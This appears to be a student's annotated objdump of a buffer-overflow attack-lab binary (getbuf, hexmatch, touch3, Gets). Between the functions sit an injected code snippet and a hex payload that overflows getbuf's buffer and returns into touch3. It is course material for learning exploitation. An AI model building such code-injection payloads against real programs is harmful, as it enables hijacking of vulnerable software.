  401355:	69 d0 7e 5f 00 00    	imul   $0x5f7e,%eax,%edx
  40135b:	01 fa                	add    %edi,%edx
  40135d:	89 c1                	mov    %eax,%ecx
  40135f:	89 14 8c             	mov    %edx,(%rsp,%rcx,4)
  401362:	83 c0 01             	add    $0x1,%eax
  401365:	83 f8 09             	cmp    $0x9,%eax
  401368:	76 eb                	jbe    401355 <scramble+0x16>
  40136a:	8b 44 24 14          	mov    0x14(%rsp),%eax
  40136e:	69 c0 06 06 00 00    	imul   $0x606,%eax,%eax
  401374:	89 44 24 14          	mov    %eax,0x14(%rsp)
  401378:	8b 44 24 0c          	mov    0xc(%rsp),%eax
  40137c:	69 c0 b7 bc 00 00    	imul   $0xbcb7,%eax,%eax
  401382:	89 44 24 0c          	mov    %eax,0xc(%rsp)
  401386:	8b 44 24 0c          	mov    0xc(%rsp),%eax
  40138a:	69 c0 ff 90 00 00    	imul   $0x90ff,%eax,%eax
  401390:	89 44 24 0c          	mov    %eax,0xc(%rsp)
  401394:	8b 44 24 08          	mov    0x8(%rsp),%eax
  401398:	69 c0 59 31 00 00    	imul   $0x3159,%eax,%eax
  40139e:	89 44 24 08          	mov    %eax,0x8(%rsp)
  4013a2:	8b 44 24 0c          	mov    0xc(%rsp),%eax
  4013a6:	69 c0 89 6e 00 00    	imul   $0x6e89,%eax,%eax
  4013ac:	89 44 24 0c          	mov    %eax,0xc(%rsp)
  4013b0:	8b 44 24 0c          	mov    0xc(%rsp),%eax
  4013b4:	69 c0 75 8f 00 00    	imul   $0x8f75,%eax,%eax
  4013ba:	89 44 24 0c          	mov    %eax,0xc(%rsp)
  4013be:	8b 44 24 20          	mov    0x20(%rsp),%eax
  4013c2:	69 c0 2e 50 00 00    	imul   $0x502e,%eax,%eax
  4013c8:	89 44 24 20          	mov    %eax,0x20(%rsp)
  4013cc:	8b 44 24 24          	mov    0x24(%rsp),%eax
  4013d0:	69 c0 49 6f 00 00    	imul   $0x6f49,%eax,%eax
  4013d6:	89 44 24 24          	mov    %eax,0x24(%rsp)
  4013da:	8b 44 24 04          	mov    0x4(%rsp),%eax
  4013de:	69 c0 7b de 00 00    	imul   $0xde7b,%eax,%eax
  4013e4:	89 44 24 04          	mov    %eax,0x4(%rsp)
  4013e8:	8b 44 24 18          	mov    0x18(%rsp),%eax
  4013ec:	69 c0 7c f3 00 00    	imul   $0xf37c,%eax,%eax
  4013f2:	89 44 24 18          	mov    %eax,0x18(%rsp)
  4013f6:	8b 44 24 14          	mov    0x14(%rsp),%eax
  4013fa:	69 c0 f7 b0 00 00    	imul   $0xb0f7,%eax,%eax
  401400:	89 44 24 14          	mov    %eax,0x14(%rsp)
  401404:	8b 44 24 20          	mov    0x20(%rsp),%eax
  401408:	69 c0 65 c5 00 00    	imul   $0xc565,%eax,%eax
  40140e:	89 44 24 20          	mov    %eax,0x20(%rsp)
  401412:	8b 44 24 0c          	mov    0xc(%rsp),%eax
  401416:	69 c0 d4 5c 00 00    	imul   $0x5cd4,%eax,%eax
  40141c:	89 44 24 0c          	mov    %eax,0xc(%rsp)
  401420:	8b 04 24             	mov    (%rsp),%eax
  401423:	69 c0 ec ac 00 00    	imul   $0xacec,%eax,%eax
  401429:	89 04 24             	mov    %eax,(%rsp)
  40142c:	8b 04 24             	mov    (%rsp),%eax
  40142f:	69 c0 9b 1c 00 00    	imul   $0x1c9b,%eax,%eax
  401435:	89 04 24             	mov    %eax,(%rsp)
  401438:	8b 44 24 1c          	mov    0x1c(%rsp),%eax
  40143c:	69 c0 fe 02 00 00    	imul   $0x2fe,%eax,%eax
  401442:	89 44 24 1c          	mov    %eax,0x1c(%rsp)
  401446:	8b 44 24 14          	mov    0x14(%rsp),%eax
  40144a:	69 c0 c3 80 00 00    	imul   $0x80c3,%eax,%eax
  401450:	89 44 24 14          	mov    %eax,0x14(%rsp)
  401454:	8b 44 24 20          	mov    0x20(%rsp),%eax
  401458:	69 c0 7c 51 00 00    	imul   $0x517c,%eax,%eax
  40145e:	89 44 24 20          	mov    %eax,0x20(%rsp)
  401462:	8b 44 24 04          	mov    0x4(%rsp),%eax
  401466:	69 c0 12 33 00 00    	imul   $0x3312,%eax,%eax
  40146c:	89 44 24 04          	mov    %eax,0x4(%rsp)
  401470:	8b 44 24 0c          	mov    0xc(%rsp),%eax
  401474:	69 c0 34 9d 00 00    	imul   $0x9d34,%eax,%eax
  40147a:	89 44 24 0c          	mov    %eax,0xc(%rsp)
  40147e:	8b 44 24 14          	mov    0x14(%rsp),%eax
  401482:	69 c0 49 a3 00 00    	imul   $0xa349,%eax,%eax
  401488:	89 44 24 14          	mov    %eax,0x14(%rsp)
  40148c:	8b 44 24 04          	mov    0x4(%rsp),%eax
  401490:	69 c0 b9 de 00 00    	imul   $0xdeb9,%eax,%eax
  401496:	89 44 24 04          	mov    %eax,0x4(%rsp)
  40149a:	8b 44 24 08          	mov    0x8(%rsp),%eax
  40149e:	69 c0 4f fa 00 00    	imul   $0xfa4f,%eax,%eax
  4014a4:	89 44 24 08          	mov    %eax,0x8(%rsp)
  4014a8:	8b 44 24 08          	mov    0x8(%rsp),%eax
  4014ac:	69 c0 69 14 00 00    	imul   $0x1469,%eax,%eax
  4014b2:	89 44 24 08          	mov    %eax,0x8(%rsp)
  4014b6:	8b 44 24 24          	mov    0x24(%rsp),%eax
  4014ba:	69 c0 7c 6c 00 00    	imul   $0x6c7c,%eax,%eax
  4014c0:	89 44 24 24          	mov    %eax,0x24(%rsp)
  4014c4:	8b 44 24 04          	mov    0x4(%rsp),%eax
  4014c8:	69 c0 76 da 00 00    	imul   $0xda76,%eax,%eax
  4014ce:	89 44 24 04          	mov    %eax,0x4(%rsp)
  4014d2:	8b 44 24 04          	mov    0x4(%rsp),%eax
  4014d6:	69 c0 b6 64 00 00    	imul   $0x64b6,%eax,%eax
  4014dc:	89 44 24 04          	mov    %eax,0x4(%rsp)
  4014e0:	8b 04 24             	mov    (%rsp),%eax
  4014e3:	69 c0 a3 20 00 00    	imul   $0x20a3,%eax,%eax
  4014e9:	89 04 24             	mov    %eax,(%rsp)
  4014ec:	8b 44 24 24          	mov    0x24(%rsp),%eax
  4014f0:	69 c0 66 f2 00 00    	imul   $0xf266,%eax,%eax
  4014f6:	89 44 24 24          	mov    %eax,0x24(%rsp)
  4014fa:	8b 44 24 14          	mov    0x14(%rsp),%eax
  4014fe:	69 c0 0a 65 00 00    	imul   $0x650a,%eax,%eax
  401504:	89 44 24 14          	mov    %eax,0x14(%rsp)
  401508:	8b 44 24 10          	mov    0x10(%rsp),%eax
  40150c:	69 c0 a5 98 00 00    	imul   $0x98a5,%eax,%eax
  401512:	89 44 24 10          	mov    %eax,0x10(%rsp)
  401516:	8b 44 24 18          	mov    0x18(%rsp),%eax
  40151a:	69 c0 a2 31 00 00    	imul   $0x31a2,%eax,%eax
  401520:	89 44 24 18          	mov    %eax,0x18(%rsp)
  401524:	8b 44 24 1c          	mov    0x1c(%rsp),%eax
  401528:	69 c0 bd 27 00 00    	imul   $0x27bd,%eax,%eax
  40152e:	89 44 24 1c          	mov    %eax,0x1c(%rsp)
  401532:	8b 44 24 08          	mov    0x8(%rsp),%eax
  401536:	69 c0 2a 2b 00 00    	imul   $0x2b2a,%eax,%eax
  40153c:	89 44 24 08          	mov    %eax,0x8(%rsp)
  401540:	8b 44 24 18          	mov    0x18(%rsp),%eax
  401544:	69 c0 f4 05 00 00    	imul   $0x5f4,%eax,%eax
  40154a:	89 44 24 18          	mov    %eax,0x18(%rsp)
  40154e:	8b 44 24 1c          	mov    0x1c(%rsp),%eax
  401552:	69 c0 6b fc 00 00    	imul   $0xfc6b,%eax,%eax
  401558:	89 44 24 1c          	mov    %eax,0x1c(%rsp)
  40155c:	8b 44 24 10          	mov    0x10(%rsp),%eax
  401560:	69 c0 07 f5 00 00    	imul   $0xf507,%eax,%eax
  401566:	89 44 24 10          	mov    %eax,0x10(%rsp)
  40156a:	8b 44 24 20          	mov    0x20(%rsp),%eax
  40156e:	69 c0 b5 9c 00 00    	imul   $0x9cb5,%eax,%eax
  401574:	89 44 24 20          	mov    %eax,0x20(%rsp)
  401578:	8b 04 24             	mov    (%rsp),%eax
  40157b:	69 c0 27 29 00 00    	imul   $0x2927,%eax,%eax
  401581:	89 04 24             	mov    %eax,(%rsp)
  401584:	8b 44 24 0c          	mov    0xc(%rsp),%eax
  401588:	69 c0 20 c8 00 00    	imul   $0xc820,%eax,%eax
  40158e:	89 44 24 0c          	mov    %eax,0xc(%rsp)
  401592:	8b 44 24 0c          	mov    0xc(%rsp),%eax
  401596:	69 c0 03 b9 00 00    	imul   $0xb903,%eax,%eax
  40159c:	89 44 24 0c          	mov    %eax,0xc(%rsp)
  4015a0:	8b 44 24 1c          	mov    0x1c(%rsp),%eax
  4015a4:	69 c0 16 b3 00 00    	imul   $0xb316,%eax,%eax
  4015aa:	89 44 24 1c          	mov    %eax,0x1c(%rsp)
  4015ae:	8b 44 24 1c          	mov    0x1c(%rsp),%eax
  4015b2:	69 c0 72 42 00 00    	imul   $0x4272,%eax,%eax
  4015b8:	89 44 24 1c          	mov    %eax,0x1c(%rsp)
  4015bc:	8b 44 24 04          	mov    0x4(%rsp),%eax
  4015c0:	69 c0 44 df 00 00    	imul   $0xdf44,%eax,%eax
  4015c6:	89 44 24 04          	mov    %eax,0x4(%rsp)
  4015ca:	8b 44 24 08          	mov    0x8(%rsp),%eax
  4015ce:	69 c0 48 a1 00 00    	imul   $0xa148,%eax,%eax
  4015d4:	89 44 24 08          	mov    %eax,0x8(%rsp)
  4015d8:	8b 44 24 14          	mov    0x14(%rsp),%eax
  4015dc:	69 c0 da 43 00 00    	imul   $0x43da,%eax,%eax
  4015e2:	89 44 24 14          	mov    %eax,0x14(%rsp)
  4015e6:	8b 44 24 04          	mov    0x4(%rsp),%eax
  4015ea:	69 c0 57 ac 00 00    	imul   $0xac57,%eax,%eax
  4015f0:	89 44 24 04          	mov    %eax,0x4(%rsp)
  4015f4:	8b 44 24 20          	mov    0x20(%rsp),%eax
  4015f8:	69 c0 55 53 00 00    	imul   $0x5355,%eax,%eax
  4015fe:	89 44 24 20          	mov    %eax,0x20(%rsp)
  401602:	8b 44 24 24          	mov    0x24(%rsp),%eax
  401606:	69 c0 9c f8 00 00    	imul   $0xf89c,%eax,%eax
  40160c:	89 44 24 24          	mov    %eax,0x24(%rsp)
  401610:	8b 04 24             	mov    (%rsp),%eax
  401613:	69 c0 e4 2e 00 00    	imul   $0x2ee4,%eax,%eax
  401619:	89 04 24             	mov    %eax,(%rsp)
  40161c:	8b 44 24 20          	mov    0x20(%rsp),%eax
  401620:	69 c0 dd 46 00 00    	imul   $0x46dd,%eax,%eax
  401626:	89 44 24 20          	mov    %eax,0x20(%rsp)
  40162a:	8b 04 24             	mov    (%rsp),%eax
  40162d:	69 c0 ce a7 00 00    	imul   $0xa7ce,%eax,%eax
  401633:	89 04 24             	mov    %eax,(%rsp)
  401636:	8b 44 24 1c          	mov    0x1c(%rsp),%eax
  40163a:	69 c0 74 06 00 00    	imul   $0x674,%eax,%eax
  401640:	89 44 24 1c          	mov    %eax,0x1c(%rsp)
  401644:	8b 44 24 04          	mov    0x4(%rsp),%eax
  401648:	69 c0 3a 2b 00 00    	imul   $0x2b3a,%eax,%eax
  40164e:	89 44 24 04          	mov    %eax,0x4(%rsp)
  401652:	8b 44 24 10          	mov    0x10(%rsp),%eax
  401656:	69 c0 a1 f5 00 00    	imul   $0xf5a1,%eax,%eax
  40165c:	89 44 24 10          	mov    %eax,0x10(%rsp)
  401660:	8b 04 24             	mov    (%rsp),%eax
  401663:	69 c0 3e c5 00 00    	imul   $0xc53e,%eax,%eax
  401669:	89 04 24             	mov    %eax,(%rsp)
  40166c:	8b 04 24             	mov    (%rsp),%eax
  40166f:	69 c0 f1 95 00 00    	imul   $0x95f1,%eax,%eax
  401675:	89 04 24             	mov    %eax,(%rsp)
  401678:	8b 44 24 08          	mov    0x8(%rsp),%eax
  40167c:	69 c0 5d cc 00 00    	imul   $0xcc5d,%eax,%eax
  401682:	89 44 24 08          	mov    %eax,0x8(%rsp)
  401686:	8b 44 24 24          	mov    0x24(%rsp),%eax
  40168a:	69 c0 0d 4c 00 00    	imul   $0x4c0d,%eax,%eax
  401690:	89 44 24 24          	mov    %eax,0x24(%rsp)
  401694:	8b 44 24 0c          	mov    0xc(%rsp),%eax
  401698:	69 c0 3d 0d 00 00    	imul   $0xd3d,%eax,%eax
  40169e:	89 44 24 0c          	mov    %eax,0xc(%rsp)
  4016a2:	8b 44 24 04          	mov    0x4(%rsp),%eax
  4016a6:	69 c0 f0 ef 00 00    	imul   $0xeff0,%eax,%eax
  4016ac:	89 44 24 04          	mov    %eax,0x4(%rsp)
  4016b0:	8b 44 24 24          	mov    0x24(%rsp),%eax
  4016b4:	69 c0 42 27 00 00    	imul   $0x2742,%eax,%eax
  4016ba:	89 44 24 24          	mov    %eax,0x24(%rsp)
  4016be:	8b 44 24 0c          	mov    0xc(%rsp),%eax
  4016c2:	69 c0 94 c6 00 00    	imul   $0xc694,%eax,%eax
  4016c8:	89 44 24 0c          	mov    %eax,0xc(%rsp)
  4016cc:	8b 44 24 10          	mov    0x10(%rsp),%eax
  4016d0:	69 c0 5b 70 00 00    	imul   $0x705b,%eax,%eax
  4016d6:	89 44 24 10          	mov    %eax,0x10(%rsp)
  4016da:	8b 44 24 08          	mov    0x8(%rsp),%eax
  4016de:	69 c0 16 f9 00 00    	imul   $0xf916,%eax,%eax
  4016e4:	89 44 24 08          	mov    %eax,0x8(%rsp)
  4016e8:	8b 44 24 04          	mov    0x4(%rsp),%eax
  4016ec:	69 c0 c1 bd 00 00    	imul   $0xbdc1,%eax,%eax
  4016f2:	89 44 24 04          	mov    %eax,0x4(%rsp)
  4016f6:	8b 44 24 14          	mov    0x14(%rsp),%eax
  4016fa:	69 c0 90 ca 00 00    	imul   $0xca90,%eax,%eax
  401700:	89 44 24 14          	mov    %eax,0x14(%rsp)
  401704:	8b 44 24 18          	mov    0x18(%rsp),%eax
  401708:	69 c0 d7 7b 00 00    	imul   $0x7bd7,%eax,%eax
  40170e:	89 44 24 18          	mov    %eax,0x18(%rsp)
  401712:	8b 44 24 14          	mov    0x14(%rsp),%eax
  401716:	69 c0 12 aa 00 00    	imul   $0xaa12,%eax,%eax
  40171c:	89 44 24 14          	mov    %eax,0x14(%rsp)
  401720:	8b 44 24 0c          	mov    0xc(%rsp),%eax
  401724:	8d 14 80             	lea    (%rax,%rax,4),%edx
  401727:	89 d0                	mov    %edx,%eax
  401729:	c1 e0 05             	shl    $0x5,%eax
  40172c:	89 44 24 0c          	mov    %eax,0xc(%rsp)
  401730:	8b 44 24 18          	mov    0x18(%rsp),%eax
  401734:	69 c0 6c 9a 00 00    	imul   $0x9a6c,%eax,%eax
  40173a:	89 44 24 18          	mov    %eax,0x18(%rsp)
  40173e:	8b 44 24 1c          	mov    0x1c(%rsp),%eax
  401742:	69 c0 57 4e 00 00    	imul   $0x4e57,%eax,%eax
  401748:	89 44 24 1c          	mov    %eax,0x1c(%rsp)
  40174c:	8b 44 24 10          	mov    0x10(%rsp),%eax
  401750:	69 c0 33 3e 00 00    	imul   $0x3e33,%eax,%eax
  401756:	89 44 24 10          	mov    %eax,0x10(%rsp)
  40175a:	8b 44 24 10          	mov    0x10(%rsp),%eax
  40175e:	69 c0 c1 08 00 00    	imul   $0x8c1,%eax,%eax
  401764:	89 44 24 10          	mov    %eax,0x10(%rsp)
  401768:	8b 44 24 18          	mov    0x18(%rsp),%eax
  40176c:	69 c0 56 c6 00 00    	imul   $0xc656,%eax,%eax
  401772:	89 44 24 18          	mov    %eax,0x18(%rsp)
  401776:	8b 44 24 18          	mov    0x18(%rsp),%eax
  40177a:	69 c0 96 77 00 00    	imul   $0x7796,%eax,%eax
  401780:	89 44 24 18          	mov    %eax,0x18(%rsp)
  401784:	8b 04 24             	mov    (%rsp),%eax
  401787:	69 c0 16 67 00 00    	imul   $0x6716,%eax,%eax
  40178d:	89 04 24             	mov    %eax,(%rsp)
  401790:	8b 44 24 10          	mov    0x10(%rsp),%eax
  401794:	69 c0 8d 52 00 00    	imul   $0x528d,%eax,%eax
  40179a:	89 44 24 10          	mov    %eax,0x10(%rsp)
  40179e:	8b 44 24 18          	mov    0x18(%rsp),%eax
  4017a2:	69 c0 70 19 00 00    	imul   $0x1970,%eax,%eax
  4017a8:	89 44 24 18          	mov    %eax,0x18(%rsp)
  4017ac:	8b 04 24             	mov    (%rsp),%eax
  4017af:	69 c0 db ec 00 00    	imul   $0xecdb,%eax,%eax
  4017b5:	89 04 24             	mov    %eax,(%rsp)
  4017b8:	8b 44 24 20          	mov    0x20(%rsp),%eax
  4017bc:	69 c0 28 62 00 00    	imul   $0x6228,%eax,%eax
  4017c2:	89 44 24 20          	mov    %eax,0x20(%rsp)
  4017c6:	8b 44 24 08          	mov    0x8(%rsp),%eax
  4017ca:	69 c0 7a 52 00 00    	imul   $0x527a,%eax,%eax
  4017d0:	89 44 24 08          	mov    %eax,0x8(%rsp)
  4017d4:	8b 44 24 24          	mov    0x24(%rsp),%eax
  4017d8:	69 c0 2b 10 00 00    	imul   $0x102b,%eax,%eax
  4017de:	89 44 24 24          	mov    %eax,0x24(%rsp)
  4017e2:	8b 44 24 1c          	mov    0x1c(%rsp),%eax
  4017e6:	69 c0 bd fd 00 00    	imul   $0xfdbd,%eax,%eax
  4017ec:	89 44 24 1c          	mov    %eax,0x1c(%rsp)
  4017f0:	8b 44 24 0c          	mov    0xc(%rsp),%eax
  4017f4:	69 c0 63 75 00 00    	imul   $0x7563,%eax,%eax
  4017fa:	89 44 24 0c          	mov    %eax,0xc(%rsp)
  4017fe:	8b 44 24 14          	mov    0x14(%rsp),%eax
  401802:	69 c0 f0 59 00 00    	imul   $0x59f0,%eax,%eax
  401808:	89 44 24 14          	mov    %eax,0x14(%rsp)
  40180c:	8b 44 24 1c          	mov    0x1c(%rsp),%eax
  401810:	69 c0 3b c4 00 00    	imul   $0xc43b,%eax,%eax
  401816:	89 44 24 1c          	mov    %eax,0x1c(%rsp)
  40181a:	8b 44 24 18          	mov    0x18(%rsp),%eax
  40181e:	69 c0 2c 40 00 00    	imul   $0x402c,%eax,%eax
  401824:	89 44 24 18          	mov    %eax,0x18(%rsp)
  401828:	8b 44 24 18          	mov    0x18(%rsp),%eax
  40182c:	69 c0 fb c2 00 00    	imul   $0xc2fb,%eax,%eax
  401832:	89 44 24 18          	mov    %eax,0x18(%rsp)
  401836:	8b 44 24 1c          	mov    0x1c(%rsp),%eax
  40183a:	69 c0 af 8c 00 00    	imul   $0x8caf,%eax,%eax
  401840:	89 44 24 1c          	mov    %eax,0x1c(%rsp)
  401844:	8b 44 24 14          	mov    0x14(%rsp),%eax
  401848:	69 c0 ec 5e 00 00    	imul   $0x5eec,%eax,%eax
  40184e:	89 44 24 14          	mov    %eax,0x14(%rsp)
  401852:	8b 44 24 08          	mov    0x8(%rsp),%eax
  401856:	69 c0 97 3f 00 00    	imul   $0x3f97,%eax,%eax
  40185c:	89 44 24 08          	mov    %eax,0x8(%rsp)
  401860:	8b 04 24             	mov    (%rsp),%eax
  401863:	69 c0 1d a3 00 00    	imul   $0xa31d,%eax,%eax
  401869:	89 04 24             	mov    %eax,(%rsp)
  40186c:	ba 00 00 00 00       	mov    $0x0,%edx
  401871:	b8 00 00 00 00       	mov    $0x0,%eax
  401876:	eb 0a                	jmp    401882 <scramble+0x543>
  401878:	89 d1                	mov    %edx,%ecx
  40187a:	8b 0c 8c             	mov    (%rsp,%rcx,4),%ecx
  40187d:	01 c8                	add    %ecx,%eax
  40187f:	83 c2 01             	add    $0x1,%edx
  401882:	83 fa 09             	cmp    $0x9,%edx
  401885:	76 f1                	jbe    401878 <scramble+0x539>
  401887:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
  40188c:	64 48 33 34 25 28 00 	xor    %fs:0x28,%rsi
  401893:	00 00 
  401895:	75 05                	jne    40189c <scramble+0x55d>
  401897:	48 83 c4 38          	add    $0x38,%rsp
  40189b:	c3                   	retq   
  40189c:	e8 3f f4 ff ff       	callq  400ce0 <__stack_chk_fail@plt>

00000000004018a1 <getbuf>:
  4018a1:	48 83 ec 28          	sub    $0x28,%rsp
  4018a5:	48 89 e7             	mov    %rsp,%rdi
  4018a8:	e8 7e 02 00 00       	callq  401b2b <Gets>
  4018ad:	b8 01 00 00 00       	mov    $0x1,%eax
  4018b2:	48 83 c4 28          	add    $0x28,%rsp
  4018b6:	c3                   	retq   

0000000000401943 <hexmatch>:
  401943:	41 54                	push   %r12
  401945:	55                   	push   %rbp
  401946:	53                   	push   %rbx
  401947:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp # sub 0x8이랑 똑같은듯
  40194b:	89 fd                	mov    %edi,%ebp
  40194d:	48 89 f3             	mov    %rsi,%rbx
  401950:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401957:	00 00 
  401959:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
  40195e:	31 c0                	xor    %eax,%eax
  401960:	e8 3b f4 ff ff       	callq  400da0 <random@plt>
  401965:	48 89 c1             	mov    %rax,%rcx
  401968:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx
  40196f:	0a d7 a3 
  401972:	48 f7 ea             	imul   %rdx
  401975:	48 01 ca             	add    %rcx,%rdx
  401978:	48 c1 fa 06          	sar    $0x6,%rdx
  40197c:	48 89 c8             	mov    %rcx,%rax
  40197f:	48 c1 f8 3f          	sar    $0x3f,%rax
  401983:	48 29 c2             	sub    %rax,%rdx
  401986:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax
  40198a:	48 8d 14 80          	lea    (%rax,%rax,4),%rdx
  40198e:	48 8d 04 95 00 00 00 	lea    0x0(,%rdx,4),%rax
  401995:	00 
  401996:	48 29 c1             	sub    %rax,%rcx
  401999:	4c 8d 24 0c          	lea    (%rsp,%rcx,1),%r12
  40199d:	41 89 e8             	mov    %ebp,%r8d
  4019a0:	b9 18 32 40 00       	mov    $0x403218,%ecx
  4019a5:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
  4019ac:	be 01 00 00 00       	mov    $0x1,%esi
  4019b1:	4c 89 e7             	mov    %r12,%rdi
  4019b4:	b8 00 00 00 00       	mov    $0x0,%eax
  4019b9:	e8 a2 f4 ff ff       	callq  400e60 <__sprintf_chk@plt>
  4019be:	ba 09 00 00 00       	mov    $0x9,%edx
  4019c3:	4c 89 e6             	mov    %r12,%rsi
  4019c6:	48 89 df             	mov    %rbx,%rdi
  4019c9:	e8 d2 f2 ff ff       	callq  400ca0 <strncmp@plt>
  4019ce:	85 c0                	test   %eax,%eax
  4019d0:	0f 94 c0             	sete   %al
  4019d3:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
  4019d8:	64 48 33 1c 25 28 00 	xor    %fs:0x28,%rbx
  4019df:	00 00 
  4019e1:	75 0c                	jne    4019ef <hexmatch+0xac>
  4019e3:	0f b6 c0             	movzbl %al,%eax
  4019e6:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
  4019ea:	5b                   	pop    %rbx
  4019eb:	5d                   	pop    %rbp
  4019ec:	41 5c                	pop    %r12
  4019ee:	c3                   	retq   
  4019ef:	e8 ec f2 ff ff       	callq  400ce0 <__stack_chk_fail@plt>

0000000000000000 <.text>:
   0:   48 bf 41 32 45 31 39    movabs $0x3732373931453241,%rdi
   7:   37 32 37
   a:   c3  

48 bf 41 32 45 31 39 37 32 37 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f4 19 40 00 00 00 00 00


00000000004019f4 <touch3>:
  4019f4:	53                   	push   %rbx
  4019f5:	48 89 fb             	mov    %rdi,%rbx
  4019f8:	c7 05 fa 2a 20 00 03 	movl   $0x3,0x202afa(%rip)        # 6044fc <vlevel>
  4019ff:	00 00 00 
  401a02:	48 89 fe             	mov    %rdi,%rsi
  401a05:	8b 3d f9 2a 20 00    	mov    0x202af9(%rip),%edi        # 604504 <cookie>
  401a0b:	e8 33 ff ff ff       	callq  401943 <hexmatch>
  401a10:	85 c0                	test   %eax,%eax
  401a12:	74 2b                	je     401a3f <touch3+0x4b>
  401a14:	48 89 da             	mov    %rbx,%rdx
  401a17:	be 70 32 40 00       	mov    $0x403270,%esi
  401a1c:	bf 01 00 00 00       	mov    $0x1,%edi
  401a21:	b8 00 00 00 00       	mov    $0x0,%eax
  401a26:	e8 b5 f3 ff ff       	callq  400de0 <__printf_chk@plt>
  401a2b:	bf 03 00 00 00       	mov    $0x3,%edi
  401a30:	e8 4b 03 00 00       	callq  401d80 <validate>
  401a35:	bf 00 00 00 00       	mov    $0x0,%edi
  401a3a:	e8 f1 f3 ff ff       	callq  400e30 <exit@plt>
  401a3f:	48 89 da             	mov    %rbx,%rdx
  401a42:	be 98 32 40 00       	mov    $0x403298,%esi
  401a47:	bf 01 00 00 00       	mov    $0x1,%edi
  401a4c:	b8 00 00 00 00       	mov    $0x0,%eax
  401a51:	e8 8a f3 ff ff       	callq  400de0 <__printf_chk@plt>
  401a56:	bf 03 00 00 00       	mov    $0x3,%edi
  401a5b:	e8 e5 03 00 00       	callq  401e45 <fail>
  401a60:	eb d3                	jmp    401a35 <touch3+0x41>

0000000000401a62 <test>:
  401a62:	48 83 ec 08          	sub    $0x8,%rsp
  401a66:	b8 00 00 00 00       	mov    $0x0,%eax
  401a6b:	e8 31 fe ff ff       	callq  4018a1 <getbuf>
  401a70:	89 c2                	mov    %eax,%edx
  401a72:	be c0 32 40 00       	mov    $0x4032c0,%esi
  401a77:	bf 01 00 00 00       	mov    $0x1,%edi
  401a7c:	b8 00 00 00 00       	mov    $0x0,%eax
  401a81:	e8 5a f3 ff ff       	callq  400de0 <__printf_chk@plt>
  401a86:	48 83 c4 08          	add    $0x8,%rsp
  401a8a:	c3                   	retq   

0000000000401a8b <save_char>:
  401a8b:	8b 05 93 36 20 00    	mov    0x203693(%rip),%eax        # 605124 <gets_cnt>
  401a91:	3d ff 03 00 00       	cmp    $0x3ff,%eax
  401a96:	7f 49                	jg     401ae1 <save_char+0x56>
  401a98:	89 f9                	mov    %edi,%ecx
  401a9a:	c0 e9 04             	shr    $0x4,%cl
  401a9d:	8d 14 40             	lea    (%rax,%rax,2),%edx
  401aa0:	83 e1 0f             	and    $0xf,%ecx
  401aa3:	0f b6 b1 e0 35 40 00 	movzbl 0x4035e0(%rcx),%esi
  401aaa:	48 63 ca             	movslq %edx,%rcx
  401aad:	40 88 b1 20 45 60 00 	mov    %sil,0x604520(%rcx)
  401ab4:	8d 4a 01             	lea    0x1(%rdx),%ecx
  401ab7:	83 e7 0f             	and    $0xf,%edi
  401aba:	0f b6 b7 e0 35 40 00 	movzbl 0x4035e0(%rdi),%esi
  401ac1:	48 63 c9             	movslq %ecx,%rcx
  401ac4:	40 88 b1 20 45 60 00 	mov    %sil,0x604520(%rcx)
  401acb:	83 c2 02             	add    $0x2,%edx
  401ace:	48 63 d2             	movslq %edx,%rdx
  401ad1:	c6 82 20 45 60 00 20 	movb   $0x20,0x604520(%rdx)
  401ad8:	83 c0 01             	add    $0x1,%eax
  401adb:	89 05 43 36 20 00    	mov    %eax,0x203643(%rip)        # 605124 <gets_cnt>
  401ae1:	f3 c3                	repz retq 

0000000000401ae3 <save_term>:
  401ae3:	8b 05 3b 36 20 00    	mov    0x20363b(%rip),%eax        # 605124 <gets_cnt>
  401ae9:	8d 04 40             	lea    (%rax,%rax,2),%eax
  401aec:	48 98                	cltq   
  401aee:	c6 80 20 45 60 00 00 	movb   $0x0,0x604520(%rax)
  401af5:	c3                   	retq   

0000000000401af6 <check_fail>:
  401af6:	48 83 ec 08          	sub    $0x8,%rsp
  401afa:	0f be 15 27 36 20 00 	movsbl 0x203627(%rip),%edx        # 605128 <target_prefix>
  401b01:	41 b8 20 45 60 00    	mov    $0x604520,%r8d
  401b07:	8b 0d eb 29 20 00    	mov    0x2029eb(%rip),%ecx        # 6044f8 <check_level>
  401b0d:	be e3 32 40 00       	mov    $0x4032e3,%esi
  401b12:	bf 01 00 00 00       	mov    $0x1,%edi
  401b17:	b8 00 00 00 00       	mov    $0x0,%eax
  401b1c:	e8 bf f2 ff ff       	callq  400de0 <__printf_chk@plt>
  401b21:	bf 01 00 00 00       	mov    $0x1,%edi
  401b26:	e8 05 f3 ff ff       	callq  400e30 <exit@plt>

0000000000401b2b <Gets>:
  401b2b:	41 54                	push   %r12
  401b2d:	55                   	push   %rbp
  401b2e:	53                   	push   %rbx
  401b2f:	49 89 fc             	mov    %rdi,%r12
  401b32:	c7 05 e8 35 20 00 00 	movl   $0x0,0x2035e8(%rip)        # 605124 <gets_cnt>
  401b39:	00 00 00 
  401b3c:	48 89 fb             	mov    %rdi,%rbx
  401b3f:	eb 11                	jmp    401b52 <Gets+0x27>
  401b41:	48 8d 6b 01          	lea    0x1(%rbx),%rbp
  401b45:	88 03                	mov    %al,(%rbx)
  401b47:	0f b6 f8             	movzbl %al,%edi
  401b4a:	e8 3c ff ff ff       	callq  401a8b <save_char>
  401b4f:	48 89 eb             	mov    %rbp,%rbx
  401b52:	48 8b 3d 97 29 20 00 	mov    0x202997(%rip),%rdi        # 6044f0 <infile>
  401b59:	e8 52 f2 ff ff       	callq  400db0 <_IO_getc@plt>
  401b5e:	83 f8 ff             	cmp    $0xffffffff,%eax
  401b61:	74 05                	je     401b68 <Gets+0x3d>
  401b63:	83 f8 0a             	cmp    $0xa,%eax
  401b66:	75 d9                	jne    401b41 <Gets+0x16>
  401b68:	c6 03 00             	movb   $0x0,(%rbx)
